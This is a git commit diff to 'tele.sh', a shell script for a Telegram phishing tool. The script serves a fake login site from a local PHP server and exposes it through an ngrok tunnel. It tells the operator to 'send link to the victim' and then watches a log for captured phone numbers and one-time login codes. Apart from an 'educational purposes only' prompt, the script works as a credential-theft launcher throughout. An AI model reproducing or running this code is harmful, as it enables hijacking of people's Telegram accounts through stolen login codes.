a2e917fe07358e6802d844afa15928719573fd5d
Tech cochi <61864331+rixon-cochi@users.noreply.github.com>
2020-07-05 00:23:46 +0530

    Update tele.sh

--- tele.sh
+++ tele.sh
@@ -3,14 +3,14 @@ clear
 echo ""
 echo ""
 echo ""
-printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
+printf "\e[1;33m[\e[0m + \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
 sleep 4
 echo ""
 clear
 echo ""
 echo ""
 echo ""
-read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
+read -p $'\e[1;32m\e[0m\e[1;32m T H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
 echo""
 echo""
 echo""
@@ -41,27 +41,28 @@ printf "\n"
 }
 banner
                 
-                 read -p $'\e[1;33m[\e[0m\e[1;77m [×] \e[0m\e[1;33m]\e[0m\e[1;32m ENTER 01 : \e[0m' option
+                 read -p $'\e[1;33m[\e[0m\e[1;77m × \e[0m\e[1;33m]\e[0m\e[1;32m ENTER 01 : \e[0m' option
 		 case $option in 
 			 
 
                   01)cd sites/
                   cd telegram/
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m + \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
                   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                   sleep 3
                   echo ""
-                  echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
+                  echo -e $'\e[1;33m[\e[0m\e[1;77m + \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
                   ./ngrok http 4444 > /dev/null 2>&1 &
                   sleep 25
                   echo ""
                   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                  printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
+                  printf "\e[1;33m[\e[0m + \e[1;33m] Send link to the victim :\e[0m\e[1;77m %s\e[0m\n" $link
                   echo ""
                   echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
                   echo ""
-                  tail -f log.txt | grep -e "phone_number" -e "phone_code"     
+                  echo '
+                  tail -f log.txt | grep -e "PHONE_NUMBER" -e "OTP_CODE" ' | lolcat   
 
                 ;;
 
